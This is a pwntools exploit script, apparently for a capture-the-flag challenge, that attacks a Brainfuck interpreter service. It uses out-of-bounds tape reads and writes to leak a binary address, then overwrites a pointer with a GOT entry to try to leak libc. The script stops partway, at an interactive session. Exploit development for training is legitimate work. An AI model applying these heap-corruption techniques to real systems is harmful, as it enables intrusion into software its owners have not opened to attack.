from pwn import *


r = remote("localhost", 1339)
exe = ELF("./challenge")

# OPTION 1
def send_brainfuck(brainfuck, sql_enable='n'):
    r.sendlineafter(">> ", "1")
    r.sendlineafter(" ? ", sql_enable)
    r.sendlineafter("): ", brainfuck)

def send_brainfuck_input(data):
    for i in data:
        r.sendline(i)

def send_data(data, sql_enable='n'):
    send_brainfuck(",>"*len(data), sql_enable)
    send_brainfuck_input(data.decode())

def advance_pointer(n, sql_enable='n'):
    send_brainfuck(">"*n)

# OPTION 2
def open_existing_bf(id_, data, new="y"):
    r.sendlineafter(">> ", "2")
    r.sendlineafter(">> ", str(id_))
    r.sendlineafter(" ? ", new)
    r.sendlineafter("): ", data)


# it is writing data into 0x55555559f490 which is just before the wildereness
# if its size is larger than 0x10

# Our board (tape) is allocated with 20 characters all zeroes
# Clear means remove the old state reset the datapointer to 0 and clear values.
# it wont breakpoint at put in case we didnt reset because of this:
# while (instructionPointer < program.length())

"""
# important
# gefâž¤  p sizeof(BFTask)
# $24 = 0x88

structs -> chunk size
BFTask -> 0x90
map -> 0x40 

I probably have to corrupt the map and make the index 1 point to a fake tape
address and leak libc.
"""
send_brainfuck("."*0x1) #1
send_brainfuck("."*0x1, "y") #2

r.recv(4096)
# leak binary from the second BFTask
open_existing_bf(1, ">"*(0xa0 + 1) + ".>"*8, new="n")
bin_leak = u64(r.recvline().strip())
log.info("binary leak @ 0x%x", bin_leak)
exe.address = bin_leak - 0x8318
log.warn("exe base 0x%x", exe.address)

pause()
# Trying to leak libc by overwriting the vector
open_existing_bf(1, ">"*0xa8 + ",>"*8, new="y")
send_brainfuck_input(p64(exe.got.setvbuf).decode())
r.interactive()

